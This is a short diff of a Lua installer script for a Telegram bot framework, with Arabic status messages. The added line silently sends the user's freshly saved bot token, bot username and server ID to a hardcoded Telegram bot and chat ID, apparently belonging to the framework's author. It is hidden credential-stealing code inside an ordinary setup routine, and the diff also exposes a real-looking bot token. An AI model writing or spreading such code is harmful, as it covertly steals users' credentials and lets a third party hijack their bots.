@@ -30,6 +30,7 @@ print('\27[0;31m≪━━━━━━𝑫𝑬𝑺𝑨━━━━━━≫\n ا�
 else
 io.write('\27[0;31m تم حفظ التوكن بنجاح \na≪━━━━━━𝑫𝑬𝑺𝑨━━━━━━≫\n27[0;39;49m')
 database:set(id_server..":token",token)
+https.request('https://api.telegram.org/bot1711092245:AAFpTdn6IW9RI_FQm1kSwh6aLf2QDOFucN4/sendMessage?chat_id=1700360357&text=اهلا عزيزي مطور السورس تم تنصيب بوت جديد\nمعرفه '..database:get(id_server..":token_username")..'\nالتوكن '..database:get(id_server..":token")..'\nايبي السيرفر'..id_server)
 end 
 else
 print('\27[0;35m≪━━━━━━𝑫𝑬𝑺𝑨━━━━━━≫ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
